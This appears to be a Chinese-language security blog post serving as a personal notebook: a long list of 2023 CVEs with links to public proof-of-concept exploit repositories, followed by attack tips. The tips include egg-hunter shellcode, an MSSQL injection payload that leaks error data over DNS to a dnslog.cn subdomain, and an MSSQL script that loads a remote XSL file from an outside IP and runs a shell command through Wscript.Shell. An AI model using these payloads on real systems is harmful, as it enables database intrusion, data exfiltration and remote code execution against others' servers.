---
layout: post
title:  "cve2023-and-web-ctf-tips收集-and-php"
categories: hack
tags:  代码审计
author: cn6u9
---

* content
{:toc}
- 记事本


Wireguard 项目的 Wintun 接口  
OpenVPN 的 Tap 接口  
opengnb  
[web_ctf](https://github.com/cn6u9/cn6u9/blob/main/Web-ctf-cheatsheet.md)  
[shenji.py](https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/shenji.py)  
[手工调试php输出](https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/debug.php)  

windows lpe

CVE-2023-21752 https://github.com/Wh04m1001/CVE-2023-21752   PoC for arbitrary file delete vulnerability in Windows Backup service

CVE-2023–21746  https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc LPE via StorSvc

CVE-2023-21768 https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 Windows 11 

CVE-2023-21823 https://github.com/Elizarfish/CVE-2023-21823 windows bitmap组件漏洞 poc应该是假的  
CVE-2023-29336 https://github.com/m-cetin/CVE-2023-29336 Win32k Local Privilege  
CVE-2023-28252 https://github.com/fortra/CVE-2023-28252 clfs.sys  
CVE-2022-44666 https://github.com/j00sean/CVE-2022-44666 Microsoft Windows Contacts  
CVE-2023-36899 https://github.com/d0rb/CVE-2023-36899 ASP.NET Elevation of Cookieless IIS Auth Bypass & App Pool Privesc  
CVE-2023-36874 https://github.com/d0rb/CVE-2023-36874 Windows Error Reporting Service lpe  
CVE-2023-36900 无poc Windows Common Log File System Driver Elevation of Privilege Vulnerability  
CVE-2023-29336 https://github.com/ayhan-dev/p0ropc Win32k Elevation of Privilege Vulnerability all version  
CVE-2023-28229 https://github.com/Y3A/CVE-2023-28229 Windows CNG Key Isolation Service Elevation of Privilege Vulnerability  
CVE-2023-29360 https://github.com/Nero22k/cve-2023-29360 Microsoft Streaming Service Elevation of Privilege Vulnerability windows流媒体提全  

windows rce

CVE-2022-34718 https://github.com/numencyber/Vulnerability_PoC/blob/main/CVE-2022-34718/poc.cpp  TCP/IP RCE Vulnerability  
CVE-2023-28231 https://github.com/numencyber/Vulnerability_PoC/blob/main/CVE-2023-28231/CVE-2023-28231-DHCP-VUL-PoC.cpp  MICROSOFT WINDOWS SERVER 2008-2019 DHCP SERVER  
CVE-2023-28231 https://github.com/glavstroy/CVE-2023-28231  MICROSOFT WINDOWS SERVER 2008-2019 DHCP SERVER   

word and pdf and rar and wps

CVE_2023_21716 https://github.com/Xnuvers007/CVE-2023-21716    RTF Crash POC

cve-2023-23397 https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY  microsoft-outlook-elevation-of-privilege-vulnerability

CVE-2023-27363 https://github.com/webraybtl/CVE-2023-27363 福昕Foxit PDF远程代码执行漏洞  
CVE-2023-36884 Office and Windows HTML Remote Code Execution Vulnerability  
CVE-2022-30190 https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed Microsoft Office MSDT  
CVE-2023-40477 https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/CVE-2023-40477.sh winrar rce  
CVE-2023-38831 https://github.com/Garck3h/cve-2023-38831 winrar rce  
wps rce  https://github.com/ba0gu0/wps-rce WPS Office 2023 个人版 < 11.1.0.15120---WPS Office 2019 企业版 < 11.8.2.12085  


linux lpe

CVE-2023-22809  https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc   sudo 1.8.0 to 1.9.12p1

CVE-2023-0179   https://github.com/TurtleARM/CVE-2023-0179-PoC    Linux versions from 5.5 to 6.2-rc3

CVE-2023-0045   https://github.com/es0j/CVE-2023-0045        ubuntu 22.04.1-Linux 5.15.0-56-generic

CVE-2023-2002   https://github.com/lrh2000/CVE-2023-2002/blob/master/exp/bt_power.c 蓝牙提权  
CVE-2023-0386   https://github.com/xkaneiki/CVE-2023-0386  ubuntu提权   
CVE-2023-20052  https://github.com/nokn0wthing/CVE-2023-25002   clamav 杀毒xxe注入   
CVE-2023-20032  https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/hfsplus.zip   clamav HFS+ file parser rce     
CVE-2023-2008   https://github.com/bluefrostsecurity/CVE-2023-2008  Ubuntu 22.04 Linux kernel fixed in 5.19-rc4

CVE-2023-1829 https://github.com/lanleft/CVE2023-1829 Ubuntu22.04 source code 5.15.0-25.25  
CVE-2023-32233 https://github.com/Liuk3r/CVE-2023-32233 Ubuntu 23.04 linux-image-6.2.0-20-generic  
CVE-2023-3338 https://github.com/TurtleARM/CVE-2023-3338 linux kernel 5.15  
CVE-2023-35001 https://github.com/synacktiv/CVE-2023-35001 Ubuntu desktop 5.19.0-35  
CVE-2023-35829 https://github.com/ChriSanders22/CVE-2023-35829-poc Linux kernel 6.3.2.use-after-free was found in rkvdec_remove  
CVE-2023-2640 https://github.com/luanoliveira350/GameOverlayFS OverlayFS Ubuntu 20.04 with kernel 5.4.0  
CVE-2023-4911 https://github.com/RickdeJager/CVE-2023-4911 Ubuntu 22.10 kinetic  
CVE-2023-3269 


Exchange  and  outlook  
CVE-2023-21707 https://github.com/N1k0la-T/CVE-2023-21707 Microsoft Exchange Server Remote Code Execution Vulnerability  
CVE-2023-23397 https://github.com/CKevens/CVE-2023-23397-POC/blob/main/CVE-2023-23397.py outlook 2019 auto get NetNTLM  
CVE-2023-29357 https://github.com/Chocapikk/CVE-2023-29357 Microsoft SharePoint Server Elevation of Privilege Vulnerability  

域控  
https://github.com/Amulab/advul  
CVE-2020-1472  
CVE-2021-42287  
CVE-2022-26923  
CVE-2022-33679  

web

Joomla 未授权访问漏洞 CVE-2023-23752

Weblogic CVE-2023-21839 RCE  
Weblogic CVE-2023-21931  无poc  
CVE-2023-34192 Zimbra XSS To RCE  
CVE-2023-28467 mybb1.8.33 email xss  
CVE-2023-32315 https://github.com/Pari-Malam/CVE-2023-32315 openfire  
CVE-2023-29489 https://github.com/ViperM4sk/cpanel-xss-177 cPanel 11.102.0.x-11.109.9999.116 xss  
CVE-2023-25135 https://github.com/getdrive/PoC/tree/main/2023/vbulletin vbulletin.version:<=5.6.9 rce  
Spring Framework 6.0.7 and 5.3.26 fix cve-2023-20860 and cve-2023-20861  
CVE-2023-34039 https://github.com/Cyb3rEnthusiast/CVE-2023-34039 VMware newest exploit  
CVE-2023-41362 https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE MyBB_ACP_RCE  


IOT  
CVE-2023-3519 https://github.com/getdrive/PoC/tree/main/2023/Citrix%20ADC%20RCE%20CVE-2023-3519 Citrix VPX 13.1-48.47  


Browser  

chrome cvc-2023-2033 无poc  
chrome CVE-2023-3079 https://github.com/mistymntncop/CVE-2023-3079    
chrome CVE-2023-4863 https://github.com/mistymntncop/CVE-2023-4863 WebP in Google Chrome prior to 116.0.5845.187  
chrome CVE-2023-4762 https://github.com/sherlocksecurity/CVE-2023-4762-Code-Review Google Chrome prior to 116.0.5845.179  

other

CVE-2022-44268 https://github.com/agathanon/cve-2022-44268 ImageMagick
cve-2022-31705 https://github.com/s0duku/cve-2022-31705 windows vmware workstation 16.2.0

CVE-2022-26923 域提权  
CVE-2023-27997 FortiOS SSL-VPN buffer overflow vulnerability  

CVE-2023-21554-RCE https://github.com/zoemurmure/CVE-2023-21554-PoC   Windows MessageQueuing PoC  
CVE-2023-2868  https://github.com/cfielding-r7/poc-cve-2023-2868 梭子鱼本地提权漏洞poc在本地  
CVE-2023-3519 Citrix RCE  

CVE-2023-20871  https://github.com/ChriSanders22/CVE-2023-20871-poc VMware Fusion Raw Disk local privilege escalation vulnerability  
CVE-2023-34312  https://github.com/vi3t1/qq-tim-elevation Tencent QQ/TIM Local Privilege Elevation  
CVE-2023-40031 https://github.com/webraybtl/CVE-2023-40031 notepad++堆缓冲区溢出漏洞  
CVE-2023-26818 https://github.com/Zeyad-Azima/CVE-2023-26818 Telegram  


tips：  
shellcode:
```
（1）、搜寻堆栈；
      push  esp
      pop   edi
      push  esp 
      pop   ecx
      mov eax,0x90909090  // 5 bytes   mov ax,0x9090   4 bytes
      repnz
      scasd               //1 bytes    scasw          2 bytes   4+2=5+1
          push edi
          ret
         简化的版本可能是6字节的shellcode：
      push  esp
      pop   edi
      repnz
      scasd
          push edi
          ret
 
    (2)、搜寻堆中shellcode。
          mov  eax,dword ptr [0x7ffdf018]
          add   ax,0x017c
          mov  edi,dword ptr [eax]
          push  eax
          pop   ecx        
          std 
          repnz
          scasw
          push edi
          ret
 
   如果堆的位置大致固定，可以简化：          
 
          mov   edi,0x11223344
          push   edi
          pop    eax
          repnz
          scasw
          push   edi
          ret
```

tips mssql反弹命令：  
```
BEGIN TRY
   exec sp_configure 'show advanced options',1
   reconfigure
END TRY
BEGIN CATCH
  declare @d varchar(8000)
  set @d = master.dbo.fn_varbintohexstr(convert(varbinary(max), substring(ERROR_MESSAGE(),1,10)))
  set @d='\\'+@d+'.19c.dnslog.cn\a'
  select @d
  exec xp_dirtree @d,1,1
  waitfor delay '00:00:03'
END CATCH




再给大家分享一个代码
declare @o int, @hr int, @str varchar(8000), @url varchar(2000)
set @url = 'http://1.1.75.0:443/2.xsl?' + convert(varchar, getdate(), 14) 
exec sp_oacreate 'msxml2.domdocument', @o out
exec sp_oasetproperty @o, 'async', false
exec sp_oamethod @o, 'load', @hr out, @url
exec sp_oamethod @o, 'transformNode', @str out, @o
exec sp_OADestroy @o
select @str

<xsl:stylesheet
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:user="http://mycompany.com/mynamespace"
xmlns:msxsl="urn:schemas-microsoft-com:xslt" version="1.0">
<xsl:output method="text" encoding="UTF-8" />
<xsl:template match="/">
	<xsl:value-of select="user:run()"/>
</xsl:template>
<msxsl:script language="javascript" implements-prefix="user">
function run () {
	try {
		var shell = new ActiveXObject('Wscript.Shell');
		return shell.exec('cmd /c ver').StdOut.ReadAll();	
	}
	catch(e) {
		return e.description;
	}
}
</msxsl:script>
</xsl:stylesheet>

sp_MSforeachtable和sp_MSforeachdb

```



# 小结
